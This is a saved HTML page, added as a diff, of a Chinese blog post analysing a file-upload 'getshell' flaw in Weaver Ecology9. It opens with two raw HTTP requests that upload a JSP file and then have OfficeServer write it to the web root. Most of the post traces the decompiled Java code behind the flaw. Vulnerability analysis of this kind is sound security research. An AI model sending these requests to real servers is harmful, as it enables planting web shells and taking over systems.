@@ -1,0 +1,409 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Ecology9 文件上传分析 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Ecology9 文件上传分析 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="正文
+ecology9文件上传getshell分为两部分，第一部分payload
+POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+Host:xxx
+Content-Type: ..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Ecology9 文件上传分析
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="正文">正文</h1>
+<p>ecology9文件上传getshell分为两部分，第一部分payload</p>
+<pre><code>POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+Host:xxx
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+Content-Length: 531
+
+------WebKitFormBoundarymVk33liI64J7GQaK
+Content-Disposition: form-data; name=&quot;secId&quot;
+
+1
+------WebKitFormBoundarymVk33liI64J7GQaK
+Content-Disposition: form-data; name=&quot;Filedata&quot;; filename=&quot;hello.jsp&quot;
+
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+
+
+&lt;%out.print(&quot;Hello World！&quot;);%&gt;
+
+------WebKitFormBoundarymVk33liI64J7GQaK
+Content-Disposition: form-data; name=&quot;plandetailid&quot;
+
+1
+------WebKitFormBoundarymVk33liI64J7GQaK--
+</code></pre>
+<p>第二部分为</p>
+<pre><code>POST /OfficeServer HTTP/1.1
+Host:xxx
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVk33liI64J7GQaK
+Content-Length: 207
+
+------WebKitFormBoundarymVk33liI64J7GQaK
+Content-Disposition: form-data; name=&quot;aaa&quot;
+
+{'OPTION':'INSERTIMAGE','isInsertImageNew':'1','imagefileid4pic':'18064'}
+
+------WebKitFormBoundarymVk33liI64J7GQaK--
+</code></pre>
+<p>先看第一部分，对应的文件是<code>/workrelate/plan/util/uploaderOperate.jsp</code>。具体部分代码如下</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818182042423.png" alt="image-20220818182042423" loading="lazy"></figure>
+<p>最开始new了一个DesUtil工具类，然后设置响应包头，new了一个FileUpload对象，然后就是new了一个User类并且设置了一些传入的参数，然后在secId不等于0的时候调用deu.uploadDocToImg，deu是<code>weaver.docs.docs.DocExtUtil</code>工具类，这些都不看，直接先看这个FileUpload对象，去看他的构造方法</p>
+<pre><code class="language-java">public FileUpload(HttpServletRequest var1, String var2) {
+    this.remoteAddr = var1.getRemoteAddr();
+    if (this.isMultipartData(var1)) {
+        this.mpdata = this.getAttachment(var1, var2);
+    }
+
+    this.request = var1;
+    this.xss = new XssUtil();
+}
+</code></pre>
+<p>获取了请求服务器的ip地址，并且调用<code>isMultipartData</code>方法判断Content-Type是不是multipart/form-data开头，并且调用了<code>this.getAttachment</code>看着像是获取附件内容，跟进</p>
+<pre><code class="language-java">private MultipartRequest getAttachment(HttpServletRequest var1, String var2) {
+    if (this.isMultipartData(var1)) {
+        try {
+            DefaultFileRenamePolicy var3 = new DefaultFileRenamePolicy();
+            SystemComInfo var4 = new SystemComInfo();
+            String var5 = getCreateDir(var4.getFilesystem());
+            this.isaesencrypt = var4.getIsaesencrypt();
+            this.aescode = Util.getRandomString(13);
+            if (var4.getNeedzip().equals(&quot;1&quot;)) {
+                this.needzip = true;
+            }
+            return new MultipartRequest(var1, var5, var1.getContentLength(), var3, this.needzip, this.needzipencrypt, var2, this.isaesencrypt, this.aescode);
+        } catch (Exception var6) {
+            this.writeLog(var6);
+            return null;
+        }
+    } else {
+        return null;
+    }
+}
+</code></pre>
+<p>new了DefaultFileRenamePolicy和SystemComInfo两个对象，并且调用了<code>getCreateDir</code>方法，用<code>var4.getFilesystem()</code>作为参数</p>
+<pre><code class="language-java">public String getFilesystem() {
+    if (this.filesystem != null &amp;&amp; !this.filesystem.equals(&quot;&quot;) &amp;&amp; !this.filesystem.endsWith(&quot;/&quot;) &amp;&amp; !this.filesystem.endsWith(&quot;\\&quot;)) {
+        this.filesystem = this.filesystem + File.separatorChar;
+    }
+
+    return this.filesystem;
+}
+</code></pre>
+<p>其实就是返回var4.filesystem，继续看getCreateDir方法</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818184017490.png" alt="image-20220818184017490" loading="lazy"></figure>
+<p>var0是传进来的第一个参数，直接来到第二个if，并且把v0中的<code>\\</code>和<code>/</code>都替换成一个乱七八糟的字符串，然后最后把乱七八糟的字符串替换为空，并且把var0后补个文件分割符，后续就是构造他的上路径了吧，构造出var0并返回。</p>
+<p>回到getAttachment方法，判断了是否aes加密并且通过Util工具类获取了一个随机字符串，然后返回了一个MultipartRequest的对象，这个对象的构造方法调用了他的重载方法。</p>
+<figure data-type="image" tabindex="3"><img src="assets/image-20220818185026323.png" alt="image-20220818185026323" loading="lazy"></figure>
+<p>开始初始化了一些属性，传进来的var1不是空的，所以就进入else，并且这里的var2就是在<code>getAttachment</code>方法中的var5，是通过<code>getCreateDir</code>获取的一个path，不是空，然后就是new了一个MultipartParser对象，等我们用到再来看这个对象。new完以后就是一个if判断，判断get请求参数是否是空的，我们这里是post方法，直接跳过这个if了。</p>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818190139536.png" alt="image-20220818190139536" loading="lazy"></figure>
+<p>来到下面这while循环，通过调用刚刚new出来的MultipartParser对象的readNextPart方法，这里说一下吧，个人推断<code>MultipartParser</code>这个对象是对content-type为multipart/form-data这种包的分析器，先来看看这个对象的构造方法</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818190454485.png" alt="image-20220818190454485" loading="lazy"></figure>
+<p>很明显的能看到他通过两种途径获取了content-type，返回长度比较长的那个，然后还判断了content-type是不是以multipart/form-data开头，剩下的都是乱七八糟的东西，暂时好像没什么影响，先不分析，继续回到<code>MultipartRequest</code>类的构造方法，调用了刚刚那个类的readNextPart方法，图在上面，var19是<code>var11.readNextPart()</code>的返回值，在这个while里有一个if条件判断，他有两个分支，分别是满足var19.isParam为true和var19.isFile()两种情况，这里先看readNextPart这个方法的返回对象类型，他是返回part，去找找part是啥类</p>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818191223375.png" alt="image-20220818191223375" loading="lazy"></figure>
+<p>这里我看半天，只能找到part是ParamPart，他的<code>isParam</code>方法如下</p>
+<pre><code class="language-java">public boolean isParam() {
+    return true;
+}
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818191322836.png" alt="image-20220818191322836" loading="lazy"></figure>
+<p>其实他还有一种是FilePart，他的isFile方法是返回true，在readNextPart方法中也能找到</p>
+<pre><code class="language-java">public boolean isFile() {
+    return true;
+}
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818191600494.png" alt="image-20220818191600494" loading="lazy"></figure>
+<p>所以我这里就直接猜var11通过调用readNextPart方法来判断请求包中的某部分是参数还是文件内容？如果是文件内容会返回FileType，如果是参数会返回ParamPart，继续看readNextPart方法，只讲部分。</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818192938122.png" alt="image-20220818192938122" loading="lazy"></figure>
+<p>画的不好看啊见谅，这里就直接判断是否是<code>content-disposition:</code>开头，然后把里面的参数分割成数组，对应给到name，filename</p>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220818193039332.png" alt="image-20220818193039332" loading="lazy"></figure>
+<p>然后走到下面，filename不为空就直接返回了一个new出来的FilePart，如果filename是空，就会走到下面，返回ParamPart，FilePart构造方法如下</p>
+<pre><code class="language-java">FilePart(String var1, ServletInputStream var2, String var3, String var4, String var5, String var6) throws IOException {
+    super(var1);
+    this.fileName = var5;
+    if (var5 != null) {
+        this.oriFileName = new String(var5.getBytes(&quot;ISO8859_1&quot;), &quot;UTF-8&quot;);
+    }
+
+    this.filePath = var6;
+    this.contentType = var4;
+    this.partInput = new PartInputStream(var2, var3);
+}
+</code></pre>
+<p>所以对应的我们在MultipartRequest构造方法中走到<code>var19.isFile</code>这个分支，然后是判断var23和var2是否是空，var23是FileType的FileName，var2是之前<code>getCreateDir(var4.getFilesystem())</code>的结果，然后这个var9，var10分别是isaesencrypt和aescode，然后MultipartRequest的构造方法就差不多完成了，最后是返回给FileUpload的mpdata属性，然后就是调用<code>deu.uploadDocToImg(fu,user, &quot;Filedata&quot;,mainId,subId,secId,&quot;&quot;,&quot;&quot;)</code>。在方法中调用了<code>String var21 = var1.uploadFiles(var3);</code></p>
+<pre><code class="language-java">public String uploadFiles(String var1) {
+    String[] var2 = new String[]{var1};
+    String var3 = this.getParameter(&quot;name&quot;);
+    String[] var4 = this.uploadFiles(var2, var3);
+    return var4 != null &amp;&amp; var4.length &gt;= 1 ? var4[0] : null;
+}
+</code></pre>
+<p>把参数转换成字符串数组，然后接收name的值，继续调用uploadFiles重载方法</p>
+<pre><code class="language-java">public String[] uploadFiles(String[] var1, String var2) {
+    if (this.mpdata == null) {
+        return null;
+    } else {
+        int var3 = var1.length;
+        String[] var4 = new String[var3];
+        this.filenames = new String[var3];
+
+        for(int var5 = 0; var5 &lt; var3; ++var5) {
+            this.filenames[var5] = SecurityMethodUtil.textXssClean(this.mpdata.getOriginalFileName(var1[var5]));
+            if (this.filenames[var5] == null || &quot;&quot;.equals(this.filenames[var5])) {
+                return var4;
+            }
+
+            if (!StringUtils.isBlank(var2) &amp;&amp; !var2.equals(this.filenames[var5]) &amp;&amp; (var2.equals(this.filenames[var5]) || &quot;file&quot;.equals(this.filenames[var5]))) {
+                this.filenames[var5] = var2;
+                var4[var5] = this.saveFile(var1[var5], var2, this.mpdata);
+            } else {
+                var4[var5] = this.saveFile(var1[var5], this.mpdata);
+            }
+        }
+
+        return var4;
+    }
+}
+</code></pre>
+<p>可以看到，不管怎么样，最后都是会调用一个<code>this.saveFile</code>方法，直接跟进</p>
+<figure data-type="image" tabindex="11"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819093247763.png" alt="image-20220819093247763" loading="lazy"></figure>
+<p>在开始是获取了一些信息，但是我们知道刚刚传进来的第三个参数是一个MultipartRequest对象，其他俩都是字符串，我们直接找与var3参数有关的代码即可。</p>
+<figure data-type="image" tabindex="12"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819093403474.png" alt="image-20220819093403474" loading="lazy"></figure>
+<p>通过var3获取了一个File对象var32，并且获取了一下他的文件长度，判断是否需要zip压缩，如果要就走ZipInputStream，如果不要就走BufferedInputStream，还判断是否需要aes加密，如果需要则再进行一次加密，到最后会调用到var41.setInput和var41.check，代码分别如下</p>
+<pre><code class="language-java">public void setInput(InputStream var1) {
+    this.in = var1;
+    this.din = null;
+}
+</code></pre>
+<pre><code class="language-java">public boolean check() {
+    this.format = -1;
+    this.width = -1;
+    this.height = -1;
+    this.bitsPerPixel = -1;
+    this.numberOfImages = 1;
+    this.physicalHeightDpi = -1;
+    this.physicalWidthDpi = -1;
+    this.comments = null;
+
+    try {
+        int var1 = this.read() &amp; 255;
+        int var2 = this.read() &amp; 255;
+        if (var1 == 71 &amp;&amp; var2 == 73) {
+            return this.checkGif();
+        } else if (var1 == 137 &amp;&amp; var2 == 80) {
+            return this.checkPng();
+        } else if (var1 == 255 &amp;&amp; var2 == 216) {
+            return this.checkJpeg();
+        } else if (var1 == 66 &amp;&amp; var2 == 77) {
+            return this.checkBmp();
+        } else if (var1 == 10 &amp;&amp; var2 &lt; 6) {
+            return this.checkPcx();
+        } else if (var1 == 70 &amp;&amp; var2 == 79) {
+            return this.checkIff();
+        } else if (var1 == 89 &amp;&amp; var2 == 166) {
+            return this.checkRas();
+        } else if (var1 == 80 &amp;&amp; var2 &gt;= 49 &amp;&amp; var2 &lt;= 54) {
+            return this.checkPnm(var2 - 48);
+        } else {
+            return var1 == 56 &amp;&amp; var2 == 66 ? this.checkPsd() : false;
+        }
+    } catch (IOException var3) {
+        return false;
+    }
+}
+</code></pre>
+<p>其实这里很奇怪，var41.setInput和var41.check并没有输出写文件的代码，在saveFile方法中代码走到这也差不多结束了，那我们上传的文件是在哪里进行写入的还是找不到。我在这里卡了很久，突然想到payload有俩包，一个是传文件，一个操作我还是不知道干啥，这里我继续在saveFile方法里找，发现了有写数据库的操作</p>
+<figure data-type="image" tabindex="13"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819094005382.png" alt="image-20220819094005382" loading="lazy"></figure>
+<p>这大概就懂了，估计是第一个包先把文件搞到数据库里去，然后第二个包给他弄出来，那我们直接先分析第二个包。他的路由是去OfficeServer，通过在xml文件里找到对应的servlet路径如下<code>classbean/DBstep/OfficeServer.class</code></p>
+<figure data-type="image" tabindex="14"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819094130149.png" alt="image-20220819094130149" loading="lazy"></figure>
+<p>首先判断是不是post方法，然后根据传入的OPTION进入不同的分支，这里传的应该是INSERTIMAGE，走到对应的分支</p>
+<figure data-type="image" tabindex="15"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819094249853.png" alt="image-20220819094249853" loading="lazy"></figure>
+<p>先从传入的json中获取一点参数，判断isInsertImageNew是否为1，我们这里是1，进入if分支，获取了imagefileid4pic参数值，然后执行了如下代码<code>var6.executeQuery(&quot;select imagefilename from imagefile  where imagefileid=?&quot;, new Object[]{var8});</code>，刚刚在savefiles也是把文件数据写到imagefile 表中，并且我们还需要把第一个包中的<strong>fileid</strong>值获取给到第二包中的imagefileid4pic，那这里大概就是我猜想的那样，先把文件搞到数据库，然后从数据库中弄出来。继续看代码，如果查询出来有值，获取他的后缀，如果没有后缀默认jpg，然后调用<code>OdocFileUtil.getFileFromByte(OdocFileUtil.inputStream2Byte(ImageFileManager.getInputStreamById(Integer.valueOf(var8))), GCONST.getRootPath(), var9);</code>首先是<code>ImageFileManager.getInputStreamById(Integer.valueOf(var8))</code>，然后是<code>OdocFileUtil.inputStream2Byte(ImageFileManager.getInputStreamById(Integer.valueOf(var8)))</code>,最后才是外面一整个。先看getInputStreamById，看名字就知道是通过id获取输入流</p>
+<pre><code class="language-java">Object var1 = null;
+
+try {
+    RecordSet var2 = new RecordSet();
+    String var3 = &quot;select imagefilename,fileRealPath,signinfo,hashinfo,isZip,isaesencrypt,aescode,tokenKey,storageStatus  from ImageFile where imageFileId = &quot; + var0;
+    var2.executeSql(var3);
+    if (var2.next()) {
+        String var4 = Util.null2String(var2.getString(&quot;fileRealPath&quot;));
+        String var5 = Util.null2String(var2.getString(&quot;signinfo&quot;));
+        String var6 = Util.null2String(var2.getString(&quot;hashinfo&quot;));
+        String var7 = Util.null2String(var2.getString(&quot;isZip&quot;));
+        int var8 = Util.getIntValue(var2.getString(&quot;isaesencrypt&quot;), 0);
+        String var9 = Util.null2String(var2.getString(&quot;aescode&quot;));
+        String var10 = Util.null2String(var2.getString(&quot;tokenKey&quot;));
+        String var11 = Util.null2String(var2.getString(&quot;storageStatus&quot;));
+        String var12 = Util.null2String(var2.getString(&quot;imagefilename&quot;));
+</code></pre>
+<p>开始是通过id从数据库获取信息给到变量</p>
+<figure data-type="image" tabindex="16"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819100132283.png" alt="image-20220819100132283" loading="lazy"></figure>
+<p>然后就是在校验文件完整后把输入流对象给到var1，然后是判断var8和var14是否是满足条件的，如果满足还需要进行一层处理，差不多var1最终是到这了，因为再往下会对后缀校验，判断是否是office的格式，如果是再进行处理，如果不是就不处理了，直接return var1了。</p>
+<figure data-type="image" tabindex="17"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819100650387.png" alt="image-20220819100650387" loading="lazy"></figure>
+<p>inputStream2Byte没什么好说的，  就是把输入流转换成字节数组</p>
+<figure data-type="image" tabindex="18"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819100906453.png" alt="image-20220819100906453" loading="lazy"></figure>
+<p>最后来看getFileFromByte方法，判断var1是不是文件夹并且是否存在，然后拼接var1和var2，调用var3进行写文件。</p>
+<figure data-type="image" tabindex="19"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220819101028862.png" alt="image-20220819101028862" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/c3p0-fan-xu-lie-hua-lian/">
+              <h3 class="post-title">
+                C3P0反序列化链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
